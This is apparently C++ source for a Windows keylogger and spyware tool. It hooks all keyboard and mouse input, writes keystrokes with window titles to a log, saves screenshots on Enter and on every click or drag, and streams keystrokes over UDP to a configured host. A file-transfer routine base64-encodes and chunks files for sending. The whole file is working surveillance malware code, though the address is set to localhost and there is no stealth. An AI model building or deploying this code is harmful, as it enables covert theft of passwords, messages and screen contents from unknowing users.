#include "pch.h"
#include <iostream>
#include <string>
#include <ctime>
#include <WS2tcpip.h>
#include <fstream>
#include <vector>
#include <sstream>
#include "wtypes.h"
#include <Windows.h>
#include <iomanip>
#include <vector>
#include <chrono>
#include <gdiplus.h>
#include <thread>
#include <cstdio>
#include <direct.h>
#include "sha512.hh"

#pragma comment (lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma warning( disable : 4267)
#pragma warning( disable : 4996)

using namespace std;
using namespace Gdiplus;
using namespace sw;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK mouseHook;
HHOOK keyboardHook;
HWND prevWindow;
POINT pd;
POINT pu;
SOCKET outst;
sockaddr_in servers;
WSADATA datas;
WORD versions;

ofstream logfile;

long file_pos;
int w = 1920;
int h = 1080;
int save_screenshot(string filename, ULONG uQuality);

char title[1024];
static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" "abcdefghijklmnopqrstuvwxyz" "0123456789+/";

string currentDateTime();
string encode64(string filename);
string base64_decode(std::string const& encoded_string);
string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);

void decode64(string b64, string output);
void startSocket(SOCKET &out = outst, SOCKADDR_IN &server = servers, WORD &version = versions, WSADATA &data = datas, int port = 1337);
void send_text(string data, SOCKET out = outst, SOCKADDR_IN server = servers);
void send_file(string filename, SOCKET out = outst, SOCKADDR_IN server = servers);
void print_vector(vector<string> v);

//TODO: fix with get key-state aka GetKeyState(key)
bool shift = false;
bool control = false;
bool windows = false;
// -- -- -- -- -- --
bool is_file_alive(string filename);
bool dir_Exists(const string& dirName_in);
static inline bool is_base64(unsigned char c);

int main()
{
	_mkdir("sc");
	locale swedish("swedish");
	locale::global(swedish);
	startSocket();
	char buffer[256];
	gethostname(buffer, 256);
	stringstream sd;
	sd << R"(Long-term_)" << buffer << "_keyboard_" << currentDateTime() + ".log";
	logfile.open(sd.str());
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, 0, 0);
	cout << "Hooking the keyboard" << endl;
	cout << "Hook: " << keyboardHook << endl;
	shift = (GetKeyState(VK_CAPITAL)) != 0;
	MSG msg{ nullptr };
	while (GetMessage(&msg, nullptr, 0, 0) != 0); //returns 0 when WM_QUIT gets called
	UnhookWindowsHookEx(keyboardHook);
	UnhookWindowsHookEx(mouseHook);
	logfile.close();
	closesocket(outst);
	WSACleanup();
	return 0;
}
void startSocket(SOCKET &out, SOCKADDR_IN &server, WORD &version, WSADATA &data, int port)
{
	version = MAKEWORD(2, 2);
	const auto wsOk = WSAStartup(version, &data);
	if (wsOk == 0)
	{
		out = socket(AF_INET, SOCK_DGRAM, 0);
		server.sin_family = AF_INET;
		server.sin_port = htons(port);
		inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
		return;
	}
	cout << "Can't start Winsock! " << wsOk;
}

bool dirExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

bool is_file_alive(string filename) {
	std::ifstream infile(filename);
	return infile.good();
}

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

void send_text(string data, SOCKET out, SOCKADDR_IN server) {
	string size = to_string(data.length());
	string typ = "TEXT";
	//cout << typ << " : " << size << " : " << data;
	auto sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
	auto sendpre = sendto(out, size.c_str(), size.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
	auto senddur = sendto(out, data.c_str(), data.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
	if (sendpre == SOCKET_ERROR || senddur == SOCKET_ERROR || sendtyp == SOCKET_ERROR)
	{
		cout << "Error: " << WSAGetLastError() << endl;
	}
}

void send_file(string filename, SOCKET out, SOCKADDR_IN server) {
	if (is_file_alive(filename)) {
		cout << "Filename: " << filename << " -> ";
	}
	else {
		cout << "Filename: " << filename << "does not exist!" << endl;
		return;
	}
	const clock_t begin_time = clock();
	cout << "Spliting File ";
	string typ = "DATA";
	string data = encode64(filename);
	cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
	const int ssize = data.length();
	auto split = 0;
	cout << "| Size: ";
	auto ihl = 1;
	while (ihl <= ssize) {
		if (ssize / ihl <= 60000 && ssize % ihl == 0)
		{
			cout << ihl << " * " << (ssize / ihl) << " = " << ihl * (ssize / ihl);
			split = ihl;
			break;
		}
		ihl++;
	}
	vector<string> datafile;
	for (auto i = 0; i < data.length(); i += (ssize / split)) {
		datafile.push_back(data.substr(i, (ssize / split)));
	}
	string size = to_string((ssize / split));
	string split_st = to_string(split);

	int sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // type
	if (sendtyp == SOCKET_ERROR) {
		cout << "send_typ Error: " << WSAGetLastError() << endl;
	}
	int sendfile = sendto(out, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // filename
	if (sendfile == SOCKET_ERROR) {
		cout << "send-file Error: " << WSAGetLastError() << endl;
	}
	int sendhash = sendto(out, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // hash
	if (sendhash == SOCKET_ERROR) {
		cout << "send-hash Error: " << WSAGetLastError() << endl;
	}
	int sendpre = sendto(out, size.c_str(), size.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // per split size
	if (sendpre == SOCKET_ERROR) {
		cout << "send-pre Error: " << WSAGetLastError() << endl;
	}
	int sendsplit = sendto(out, split_st.c_str(), split_st.size(), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // # of splits
	if (sendsplit == SOCKET_ERROR) {
		cout << "send-split Error: " << WSAGetLastError() << endl;
	}
	for (auto i = datafile.begin(); i != datafile.end(); ++i) {
		string is = *i;
		Sleep(50); //make sure this loop slows down to clients percent loop
		const int sendkys = sendto(out, is.c_str(), stoi(size), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
		if (sendkys == SOCKET_ERROR) {
			cout << "send-kys Error: " << WSAGetLastError() << endl;
		}
	}
	cout << " | <Sent File>" << endl << endl;
}

//TODO: fix ints with virtual-Key codes -> https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	const HWND fwindow = GetForegroundWindow();
	const auto key = PKBDLLHOOKSTRUCT(lParam);
#pragma region Key Down
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prevWindow != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title, strlen(title) + 1);
			const auto old_title = wtitle;
			SetWindowText(prevWindow, old_title);
			GetWindowTextA(fwindow, title, 1024);
			cout << "\n[" << currentDateTime() << "] " << "Title: " << title << " -> " << "\"keyboard hooked application\"" << endl;
			logfile << "\n[" << currentDateTime() << "] " << "Title: " << title << " -> " << "\"keyboard hooked application\"" << endl;
			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
			prevWindow = fwindow;
		}

		const auto current_key = int(key->vkCode);
		switch (current_key) {
		case 8: //backspace
		{
			send_text("[BS]");
			cout << "\b \b";
			file_pos = logfile.tellp();
			logfile.seekp(file_pos - 1);
			logfile.write("", 1); // writes space
			file_pos = logfile.tellp(); //TODO: remove char not overwrite
			logfile.seekp(file_pos - 1);
			break;
		}
		case 9: //tab
			send_text("    ");
			cout << "    ";
			logfile << "    ";
			break;
		case 13:
		{
			send_text("[ENTER]");
			cout << " [ENTER]\n";
			logfile << " [ENTER]\n";
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			break;
		}
		case 32: //space-bar
			send_text(" ");
			cout << " ";
			logfile << " ";
			break;
		case 20:
			shift = !shift;
			break;
		case 162: //ctrl
		case 163:
			control = true;
			break;
		case 91: //win-key
			windows = true;
			break;
		case 160: //shift
		case 161:
			shift = !shift;
			break;
		case 190:
			send_text(".");
			cout << ".";
			logfile << ".";
			break;
		case 187:
			send_text("?");
			cout << "?";
			logfile << "?";
			break;
		case 188:
			send_text(",");
			cout << ",";
			logfile << ",";
			break;
		case 189:
			send_text("-");
			cout << "-";
			logfile << "-";
			break;
		case 221:
			send_text("�");
			cout << "�";
			logfile << "�";
			break;
		case 222:
			send_text("�");
			cout << "�";
			logfile << "�";
			break;
		case 192:
			send_text("�");
			cout << "�";
			logfile << "�";
			break;
		default:
			if (windows && (current_key >= 65 && current_key <= 90)) {
				send_text(" WIN-[" + string(1, current_key) + "] ");
				cout << " WIN-[" << char(current_key) << "] \n";
				logfile << " WIN-[" << char(current_key) << "] \n";
				break;
			}
			if (control && (current_key >= 65 && current_key <= 90)) { // if control is pressed and the other key is (A - Z)
				cout << " CTRL-[" << char(current_key) << "] ";
				send_text(" CTRL-[" + string(1, current_key) + "]");
				logfile << " CTRL-[" << char(current_key) << "] ";
				break;
			}
			if (!shift && (current_key >= 65 && current_key <= 90)) { // (A - Z)
				send_text(string(1, current_key + 32));
				cout << char(current_key + 32);
				logfile << char(current_key + 32);
				break;
			}
			if (shift && (current_key >= 65 && current_key <= 90)) { // (A - Z) shifted
				send_text(string(1, current_key));
				cout << char(current_key);
				logfile << char(current_key);
				break;
			}
			if (shift && (current_key >= 48 && current_key <= 57)) { // shifted numbered
				if (current_key == 48) {
					send_text(string(1, current_key + 13));
					cout << char(current_key + 13);
					logfile << char(current_key + 13);
				}
				else {
					send_text(string(1, current_key - 16));
					cout << char(current_key - 16);
					logfile << char(current_key - 16);
				}
			}
			else if ((current_key >= 48 && current_key <= 57)) { // numbers
				send_text(string(1, current_key));
				cout << char(current_key);
				logfile << char(current_key);
				break;
			}
			else {
				stringstream ss;
				ss << " -UKN[0x" << hex << current_key << "]- ";
				send_text(ss.str());
				cout << int(current_key);
				break;
			}
			break;
		}
	}
#pragma endregion
#pragma region Key Up
	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
		const auto current_key = int(key->vkCode);
		switch (current_key) {
		case 91:
			windows = false;
			break;
		case 160:
		case 161:
			shift = !shift;
			break;
		case 162:
		case 163:
			control = false;
			break;
		default:;
		}
	}
#pragma endregion
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
#pragma region Mouse Up
	if (wParam == 514) {
		GetCursorPos(&pd);
		cout << "[lU]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
		cout << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
		logfile << "[U]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
		logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";

		if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			cout << " [ CLICK ] " << endl;
			logfile << " [ CLICK ] " << "[" << filename << "]" << endl;
		}
		else {
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			cout << " [ DRAG ] " << endl;
			logfile << " [ DRAG ] " << "[" << filename << "]" << endl;
		}
	}
	else if (wParam == 517) {
		GetCursorPos(&pd);

		cout << "[rU]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
		cout << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
		logfile << "[U]: {X=" << pd.x << ", Y=" << pd.y << "}, ";
		logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";

		if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			cout << " [ RCLICK ] " << endl;
			logfile << " [ RCLICK ] [" << filename << "]" << endl;
		}
		else {
			string filename = "sc\\" + currentDateTime() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			cout << " [ RDRAG ] " << endl;
			logfile << " [ RDRAG ] " << "[" << filename << "]" << endl;
		}
	}
#pragma endregion

#pragma region Mouse Down
	else if (wParam == 513) {
		GetCursorPos(&pu);
		cout << endl << "[" << currentDateTime() << "] ML[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
		logfile << endl << "[" << currentDateTime() << "] Left Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
	}
	else if (wParam == 516) {
		GetCursorPos(&pu);
		cout << endl << "[" << currentDateTime() << "] MR[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
		logfile << endl << "[" << currentDateTime() << "] Right Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
	}
#pragma endregion
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

string currentDateTime() {
	std::time_t t = std::time(nullptr);
	std::tm tm = *std::localtime(&t);
	stringstream ff;
	ff << std::put_time(&tm, "%Y-%m-%d-%H.%M.%S");
	return ff.str();
}

int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
	unsigned int num = 0, size = 0;
	GetImageEncodersSize(&num, &size);
	if (size == 0) return -1;
	ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
	if (pImageCodecInfo == NULL) return -1;
	GetImageEncoders(num, size, pImageCodecInfo);

	for (unsigned int j = 0; j < num; ++j) {
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return -1;
}

int save_screenshot(string filename, ULONG uQuality)
{
	ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplus_startup_input;
	GdiplusStartup(&gdiplusToken, &gdiplus_startup_input, nullptr);
	const auto hMyWnd = GetDesktopWindow();
	RECT r;
	HDC dc, hdcCapture;
	int n_bpp;
	LPBYTE lpCapture;
	CLSID imageCLSID;
	GetWindowRect(hMyWnd, &r);
	dc = GetWindowDC(hMyWnd);
	n_bpp = GetDeviceCaps(dc, BITSPIXEL);
	hdcCapture = CreateCompatibleDC(dc);
	BITMAPINFO bmiCapture = { sizeof(BITMAPINFOHEADER), w, -h, 1, n_bpp, BI_RGB, 0, 0, 0, 0, 0, };
	HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture, DIB_PAL_COLORS, reinterpret_cast<LPVOID *>(&lpCapture), nullptr, 0);
	if (!hbmCapture) {
		DeleteDC(hdcCapture);
		DeleteDC(dc);
		GdiplusShutdown(gdiplusToken);
		printf("failed to take the screenshot. err: %d\n", GetLastError());
		return 0;
	}
	const int n_capture = SaveDC(hdcCapture);
	SelectObject(hdcCapture, hbmCapture);
	BitBlt(hdcCapture, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	RestoreDC(hdcCapture, n_capture);
	DeleteDC(hdcCapture);
	DeleteDC(dc);
	auto p_screen_shot = new Bitmap(hbmCapture, static_cast<HPALETTE>(nullptr));
	EncoderParameters encoderParams{};
	encoderParams.Count = 1;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Guid = EncoderQuality;
	encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &uQuality;
	GetEncoderClsid((WCHAR*)(L"image/png"), &imageCLSID);
	const auto lpsz_filename = new wchar_t[filename.length() + 1];
	mbstowcs(lpsz_filename, filename.c_str(), filename.length() + 1);
	const int i_res = (p_screen_shot->Save(lpsz_filename, &imageCLSID, &encoderParams) == Ok);
	delete p_screen_shot;
	DeleteObject(hbmCapture);
	GdiplusShutdown(gdiplusToken);
	return i_res;
}

string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	auto i = 0;
	auto j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';
	}

	return ret;
}

string base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}

string encode64(string filename) {
	ifstream fin(filename, ios::binary);
	ostringstream ostring;
	ostring << fin.rdbuf();
	string dout = ostring.str();
	return base64_encode((const unsigned char *)dout.c_str(), dout.length());
}

void decode64(string b64, string output) {
	ofstream fout(output, ios::binary);
	string ofb64 = base64_decode(b64);
	fout << ofb64;
}

void print_vector(vector<string> v) {
	for (auto i = v.begin(); i != v.end(); ++i) {
		cout << *i << endl;
	}
}